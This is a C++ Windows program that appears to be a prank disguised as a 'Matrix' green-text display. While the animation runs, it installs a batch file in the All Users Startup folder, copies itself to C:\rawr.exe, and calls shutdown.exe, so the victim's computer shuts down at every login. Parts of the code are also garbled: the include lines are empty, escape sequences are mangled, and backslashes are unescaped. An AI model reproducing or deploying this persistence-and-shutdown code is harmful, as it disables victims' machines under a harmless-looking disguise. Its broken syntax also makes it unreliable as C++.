
#include
#include
#include
#include
#include
#include
#include
using namespace std;

int main()
{ keybd_event(VK_MENU,0x38,0,0);
keybd_event(VK_RETURN,0x1c,0,0);
keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
HANDLE outToScreen;
outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);

{
char buffer[255];
char inputFile[]="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\rawr.bat";
ifstream input(inputFile);
if (!input)
{
{
ofstream fp("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\rawr.bat", ios::app);
fp << "@ECHO OFF n";
fp << "START C:\rawr.exe n";
fp << "EXIT";
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
}
}
}

{
char buffer[255];
char inputFile[]="C:\rawr.exe";
ifstream input(inputFile);
if (!input)
{
{
{
ofstream fp("CLICK.bat", ios::app);
fp << "@ECHO OFF n";
fp << "COPY matrix.exe C:\rawr.exe n";
fp << "START C:\rawr.exe n";
fp << "EXIT";
}
system("START CLICK.bat");
main();
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
system("call shutdown.exe -S");
goto START;
}
}
}

START:{
for(int i = 0; i < 1; i++)
{
int num = (rand() % 10);
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
cout << setw(4) << num;
cout << setw(4) << "0%";
cout << setw(4) << "P";
cout << setw(4) << " ";
cout << setw(4) << ")";
cout << setw(4) << "#";
cout << setw(4) << "X";
cout << setw(4) << "@";
cout << setw(4) << "1&";
cout << setw(4) << "*";
cout << setw(4) << "||";
cout << setw(4) << " ";
Sleep(60);
}
}
for ( int j = 0; j < 5; j++)
{
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
int number = (rand() % 24);
cout << setw(4) << number;
}
goto START
